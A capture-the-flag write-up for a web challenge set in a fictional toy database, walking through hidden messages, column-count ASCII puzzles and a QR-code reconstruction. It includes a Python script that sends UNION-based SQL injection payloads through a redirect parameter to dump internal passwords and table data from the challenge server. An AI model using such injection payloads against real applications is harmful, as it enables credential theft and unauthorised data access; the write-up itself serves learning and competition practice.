# Santa's Shady Toy Manufacturing Business Part 2 (web 984)
A much much harder challenge than the previous.

To start off, we dig around the database and discover that the `toys_for_sale` database contains 2 hidden "staging" messages in a column: one message is for toys with exposed=0, and the other is for exposed toys. 

```
THIS IS A HIDDEN STAGING MESSAGE.
INTERNS must go read the staging message for the unexposed toys.

IF you are new to the job, welcome! Get up to speed and report daily to your assigned Elf.
OTHERWISE for older interns, you must read staging data from the other table (toys_for_sale2). The table is pretty big, so make sure you are using a terminal with many lines.
```

The `toys_for_sale2` table contains the staging message spread out accross `staging_info_part_#_chunk` columns. Putting them back together sorting by toy ID and range gives the following message:

```
THIS IS A HIDDEN STAGING MESSAGE [COM_INTERNS_LOW]

INTERNS, Temporarily use the Elf account to access the deep database we will work with for this month.
```

If we check the routines in the database, one returns the password hash for an account - calling it with "Elf" as a paramater gives that password hash. If we log into the website as Elf, we get a session cookie as the Elf user on the database.

The "Elf" database is very different. If we dump the tables, we find many `toy_manufacturing_district_ID#_ORDER_ID#_#` tables with a lot of columns and sometimes rows. We also find a table giving us a message:

```
This db is insane, what the hell is going on in here?? I have been exploring for a bit, the advice I can give you is that counting the columns can be useful I guess. Also check if the tables have something in them when doing that. After doing that remember what quick response stands for. - A fellow intern -
```

This hints to check the column numbers of the toy databases, which correspond to ascii values. If we take the ASCII values of the numbers of columns for each table with data ordered by order ID number, we get this message:

```
THIS IS A HIDDEN STAGING MESSAGE [COM_ELVES@DEPT_0x2F]

In case you haven't seen the post-it note on your desk, the function GET_QUICK_RESPONSE_MAPPING takes parameters "LOADMAP1211113128ch", YOUR_DEPARTMENT_ID, X, Y, YOUR_DEPARTMENT_PASSWORD. You can fetch the password from the table with internal passwords. We've only tested this function on our local servers, so if you're not from this department, please don't try to run that function.
```

This tells us to call the `GET_QUICK_RESPONSE_MAPPING` routine to progress next. The message tells us the target department is 0x2F. Based on the name we can guess that we are supposed to get a QR code.

When we try calling the function, we find it returns a pair of numbers for each x,y coordinate. As it turns out, there is another table `toy_quick_response` which contains columns `x0`..`x30` with values of 0 and 1. This appears to be a lookup table to the output of this function.

After messing around, I found out that the `internal_passwords`, `toy_quick_response`, and output of the `GET_QUICK_RESPONSE_MAPPING` function constantly change - so we need to obtain all of our data at once. The following script dumps that data and parses a QR code out of it:

```py
import requests
import sys
import time
import json
with open("cookies.json") as f:
    ck = json.load(f)

def getItem(i):
    while True:
        try:
            r = requests.post(url, data={"goto": '\'AND 1=2 UNION SELECT (SELECT pass FROM internal_passwords LIMIT 1 OFFSET %d) UNION SELECT (1) WHERE \'' % i}, cookies=ck, allow_redirects=False).headers["Location"][1:-5]
            break
        except KeyError:
            time.sleep(0.2)
            pass
    return r

url="http://challs.xmas.htsp.ro:3001/redirect.php"
#eq = "' AND 1=2 UNION SELECT (SELECT CONCAT_WS('|'%s)) UNION SELECT (1) WHERE '"
xn = []
for i in range(31):
    xn.append("`x" + str(i) + "`")
xn = ",".join(xn)
#print("SELECT GROUP_CONCAT(%s) FROM toy_quick_response" % xn)
#exit()
eq = "' AND 1=2 UNION SELECT (SELECT CONCAT_WS('|', %s ,c) FROM (SELECT GROUP_CONCAT(" +xn+ ") as c FROM toy_quick_response) z) UNION SELECT (1) WHERE '"
from collections import defaultdict
from tqdm import tqdm
import json
dept = 0x2f
passw = getItem(47)
print(passw)
m = []
for _ in range(31):
    m.append(["Z"]*31)
vs = []
for x in range(31):
    for y in range(31):
        vs.append("GET_QUICK_RESPONSE_MAPPING('LOADMAP1211113128ch', %d, %d, %d, '%s')" % (dept, x,y, passw))
while True:
    try:
        print(len(eq % ",".join(vs)))
        qry = eq % ",".join(vs)
        #print(qry)
        #exit()
        r = requests.post(url, data={"goto": eq % ",".join(vs)}, cookies=ck, allow_redirects=False).headers["Location"][1:-5]
        break
    except KeyError:
        #time.sleep(0.2)
        pass

l = r.split("|")
opx = [list(s) for s in l[-1].split(",")]
print(opx)
l = l[:-1]
for x in range(31):
    for y in range(31):
        xx, yy = l[x*31+y].split(",")
        xx = int(xx)
        yy = int(yy)
        m[xx][yy] = opx[y][x]

from PIL import Image
img = Image.new('RGB', (31, 31))
for x in range(31):
    for y in range(31):
        print(m[x][y], end="")
        if m[x][y] == '1':
            img.putpixel((x, y), (155,155,55))
    print()

img.save("qr%d.png" % dept)
print(dept)
```

Running this code outputs the following:

![qr](qr47.png)

This QR code contains the credentials to another user login. Logging in gives us the Part 2 flag on the website and access to part 3.

## Flag
X-MAS{H4lfw4y_th3r3_thr0ugh_7h15_t4ngly_db_121231cadxf1x]
